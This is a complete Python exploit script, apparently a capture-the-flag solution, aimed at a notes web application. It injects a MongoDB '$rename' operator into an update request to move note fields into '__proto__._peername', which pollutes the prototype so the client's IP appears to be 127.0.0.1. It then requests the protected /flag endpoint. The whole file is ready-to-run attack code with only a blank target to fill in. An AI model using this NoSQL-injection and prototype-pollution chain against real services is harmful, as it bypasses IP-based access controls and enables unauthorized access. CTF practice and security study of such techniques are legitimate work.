#!/usr/bin/env python3
import requests
import sys

TARGET = ""

def main():
    print("[*] Starting exploit chain...")

    # Step 1: Create a note with the spoofed IP
    create_payload = {
        "title": "127.0.0.1",
        "content": "IPv4"
    }
    r = requests.post(f"{TARGET}/create", json=create_payload)
    if r.status_code != 200:
        print("[-] Failed to create note.")
        sys.exit(1)
    
    note_id = r.json().get("_id")
    print(f"[+] Note created with ID: {note_id}")

    # Step 2: Exploit NoSQL injection and Prototype Pollution via $rename
    update_payload = {
        "noteId": note_id,
        "$rename": {
            "title": "__proto__._peername.address",
            "content": "__proto__._peername.family"
        }
    }
    r = requests.post(f"{TARGET}/update", json=update_payload)
    if r.status_code != 200:
        print("[-] Exploit failed. Target might be patched.")
        sys.exit(1)
    
    print("[+] Prototype polluted successfully.")

    # Step 3: Fetch the flag
    r = requests.get(f"{TARGET}/flag")
    print(f"[+] Response: {r.text}")

if __name__ == "__main__":
    main()
